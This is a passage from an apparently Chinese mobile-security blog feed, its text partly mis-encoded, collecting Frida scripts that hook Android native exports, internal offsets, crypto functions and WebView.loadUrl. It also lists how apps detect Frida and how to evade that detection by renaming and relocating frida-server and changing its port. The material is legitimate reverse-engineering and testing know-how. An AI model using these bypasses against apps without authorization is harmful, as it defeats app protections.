<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; END &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span>)</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h4 id="nativeå±‚æŸä¸ªå¯å¯¼å‡ºçš„å‡½æ•°"><a href="#nativeå±‚æŸä¸ªå¯å¯¼å‡ºçš„å‡½æ•°" class="headerlink" title="nativeå±‚æŸä¸ªå¯å¯¼å‡ºçš„å‡½æ•°"></a>nativeå±‚æŸä¸ªå¯å¯¼å‡ºçš„å‡½æ•°</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SO_NAME</span> = <span class="string">&quot;libtarget.so&quot;</span>;  <span class="comment">//.soæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FUNC</span>    = <span class="string">&quot;malloc&quot;</span>;  <span class="comment">//å¯å¯¼å‡ºçš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">/* ç­‰å¾… so åŠ è½½ */</span></span><br><span class="line">    <span class="keyword">const</span> m = <span class="keyword">await</span> <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="variable constant_">SO_NAME</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[*] <span class="subst">$&#123;SO_NAME&#125;</span> @ <span class="subst">$&#123;m.base&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* é™„åŠ å¯¼å‡ºå‡½æ•° */</span></span><br><span class="line">    <span class="keyword">const</span> mallocPtr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="variable constant_">SO_NAME</span>, <span class="variable constant_">FUNC</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(mallocPtr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">size</span> = args[<span class="number">0</span>].<span class="title function_">toInt32</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\n[malloc] size=<span class="subst">$&#123;<span class="variable language_">this</span>.size&#125;</span>`</span>);</span><br><span class="line">            <span class="comment">/* æ‰“å° Native è°ƒç”¨é“¾ */</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">                        .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>));</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[malloc] return=<span class="subst">$&#123;retval&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="nativeå±‚å†…éƒ¨å‡½æ•°"><a href="#nativeå±‚å†…éƒ¨å‡½æ•°" class="headerlink" title="nativeå±‚å†…éƒ¨å‡½æ•°"></a>nativeå±‚å†…éƒ¨å‡½æ•°</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SO_NAME</span>  = <span class="string">&quot;libtarget.so&quot;</span>;  <span class="comment">// è¦åˆ†æçš„.soæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">OFFSET</span>   = <span class="number">0x1234</span>;          <span class="comment">// é€šè¿‡IDAæˆ–Ghidraçœ‹åˆ°çš„é€»è¾‘åç§»é‡</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">RET_TYPE</span> = <span class="string">&#x27;int&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ARGS</span>     = [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> m   = <span class="keyword">await</span> <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="variable constant_">SO_NAME</span>);</span><br><span class="line">    <span class="keyword">const</span> addr= m.<span class="property">base</span>.<span class="title function_">add</span>(<span class="variable constant_">OFFSET</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[*] hook @ <span class="subst">$&#123;addr&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\n[internal] arg0=<span class="subst">$&#123;args[<span class="number">0</span>].readUtf8String()&#125;</span> arg1=<span class="subst">$&#123;args[<span class="number">1</span>].toInt32()&#125;</span>`</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">                        .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>));</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[internal] ret=<span class="subst">$&#123;retval.toInt32()&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="nativeå±‚æ‰€æœ‰å¯å¯¼å‡ºçš„å‡½æ•°"><a href="#nativeå±‚æ‰€æœ‰å¯å¯¼å‡ºçš„å‡½æ•°" class="headerlink" title="nativeå±‚æ‰€æœ‰å¯å¯¼å‡ºçš„å‡½æ•°"></a>nativeå±‚æ‰€æœ‰å¯å¯¼å‡ºçš„å‡½æ•°</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SO_NAME</span> = <span class="string">&quot;libtarget.so&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> m = <span class="keyword">await</span> <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="variable constant_">SO_NAME</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="variable constant_">SO_NAME</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[*] <span class="subst">$&#123;SO_NAME&#125;</span> å¯¼å‡ºå…±è®¡ <span class="subst">$&#123;<span class="built_in">exports</span>.length&#125;</span> ä¸ª`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exports</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">exp</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (exp.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;crypto&#x27;</span>) === -<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (exp.<span class="property">type</span> === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(exp.<span class="property">address</span>, &#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[trace] <span class="subst">$&#123;exp.name&#125;</span>(<span class="subst">$&#123;args[<span class="number">0</span>]&#125;</span>, <span class="subst">$&#123;args[<span class="number">1</span>]&#125;</span>)`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="æ£€æµ‹frida"><a href="#æ£€æµ‹frida" class="headerlink" title="æ£€æµ‹frida"></a>æ£€æµ‹frida</h2><h3 id="æ£€æµ‹æ‰‹æ®µ"><a href="#æ£€æµ‹æ‰‹æ®µ" class="headerlink" title="æ£€æµ‹æ‰‹æ®µ"></a>æ£€æµ‹æ‰‹æ®µ</h3><ol>
<li>éå†è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ä»è€Œæ£€æŸ¥frida-serveræ˜¯å¦åœ¨è¿è¡Œ</li>
<li>éå†data&#x2F;local&#x2F;tmpç›®å½•æŸ¥çœ‹æœ‰æ— fridaç›¸å…³æ–‡ä»¶</li>
<li>éå†æ˜ å°„åº“ï¼Œæ£€æµ‹fridaç›¸å…³so</li>
<li>æ£€æŸ¥27042è¿™ä¸ªé»˜è®¤ç«¯å£</li>
<li>å†…å­˜ä¸­æ‰«æfridaç‰¹å¾å­—ç¬¦ä¸² â€œLIBFRIDAâ€</li>
<li>fridaä½¿ç”¨D-Busåè®®é€šä¿¡ï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸ªå¼€æ”¾çš„ç«¯å£å‘é€D-Busçš„è®¤è¯æ¶ˆæ¯</li>
<li>æ£€æµ‹æœ‰æ— fridaç‰¹å¾çš„çº¿ç¨‹åï¼ˆå¦‚gum-js-loopï¼‰</li>
<li>æ£€æµ‹åº“å‡½æ•°å¼€å¤´å…«ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­æ˜¯å¦è¢«frida hook</li>
</ol>
<h3 id="ç»•è¿‡æ£€æµ‹"><a href="#ç»•è¿‡æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ£€æµ‹"></a>ç»•è¿‡æ£€æµ‹</h3><ol>
<li><p>ä¿®æ”¹é»˜è®¤ç«¯å£</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">adb shell su -c &quot;/data/local/tmp/frida-server -l <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">1234</span> &amp;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>frida-serverå’Œandroid_serverçš„åå­—ä¸è¦ç›´æ¥å†™æœ¬åï¼Œæ”¹æˆasï¼Œfsè¿™ç§</p>
</li>
<li><p>serverä½ç½®ä¸è¦æ”¾åœ¨data&#x2F;local&#x2F;tmp,å¯ä»¥æ”¾åœ¨data&#x2F;ç›®å½•ä¸‹</p>
</li>
</ol>
<h2 id="æ’é”™"><a href="#æ’é”™" class="headerlink" title="æ’é”™"></a>æ’é”™</h2><h3 id="æ‰¾ä¸åˆ°ç±»"><a href="#æ‰¾ä¸åˆ°ç±»" class="headerlink" title="æ‰¾ä¸åˆ°ç±»"></a>æ‰¾ä¸åˆ°ç±»</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>().<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)));</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•å†²çªoverload"><a href="#æ–¹æ³•å†²çªoverload" class="headerlink" title="æ–¹æ³•å†²çªoverload"></a>æ–¹æ³•å†²çªoverload</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># æ ¹æ®æŠ¥é”™æç¤ºè¿›è¡Œoverload</span><br><span class="line">.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>, <span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;åŒ…å.ç±»å&quot;</span>);</span><br><span class="line">    clazz.å‡½æ•°å.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa, pb</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==================  Frida Start  ==================&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°1ï¼š&quot;</span> + pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°2ï¼š&quot;</span> + pb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*æ‰“å°traceï¼ˆè°ƒç”¨é“¾ï¼‰*/</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt; stack.<span class="property">length</span>; i++) &#123;   <span class="comment">//å‰3å¸§æ˜¯Fridaå†…éƒ¨ï¼Œç•¥è¿‡</span></span><br><span class="line">            <span class="keyword">const</span> clazz_   = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> method  = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file    = stack[i].<span class="title function_">getFileName</span>() || <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line    = stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;clazz_&#125;</span>.<span class="subst">$&#123;method&#125;</span> (<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*ç»§ç»­æ‰§è¡ŒåŸæ–¹æ³•ï¼ˆåŸå‡½æ•°è‹¥æ²¡æœ‰è¿”å›å€¼ï¼Œå¯ä»¥åªè¿›è¡Œè°ƒç”¨ï¼‰*/</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.å‡½æ•°å(pa, pb);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç»“æœï¼š&quot;</span> + result);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===================  Frida End  ===================\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></blockquote>
<h2 id="webview-loadurl"><a href="#webview-loadurl" class="headerlink" title="webview-loadurl"></a>webview-loadurl</h2><h3 id="loadurl"><a href="#loadurl" class="headerlink" title="loadurl"></a>loadurl</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.webkit.WebView&quot;</span>);</span><br><span class="line">    clazz.<span class="property">loadUrl</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==================  Frida Start  ==================&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°1ï¼š&quot;</span> + pa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*æ‰“å°traceï¼ˆè°ƒç”¨é“¾ï¼‰*/</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt; stack.<span class="property">length</span>; i++) &#123;   <span class="comment">//å‰3å¸§æ˜¯Fridaå†…éƒ¨ï¼Œç•¥è¿‡</span></span><br><span class="line">            <span class="keyword">const</span> clazz_   = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> method  = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file    = stack[i].<span class="title function_">getFileName</span>() || <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line    = stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;clazz_&#125;</span>.<span class="subst">$&#123;method&#125;</span> (<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*ç»§ç»­æ‰§è¡ŒåŸæ–¹æ³•ï¼ˆåŸå‡½æ•°è‹¥æ²¡æœ‰è¿”å›å€¼ï¼Œå¯ä»¥åªè¿›è¡Œè°ƒç”¨ï¼‰*/</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">loadUrl</span>(pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===================  Frida End  ===================\n&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç§»åŠ¨å®‰å…¨</category>
      </categories>
  </entry>
</search>
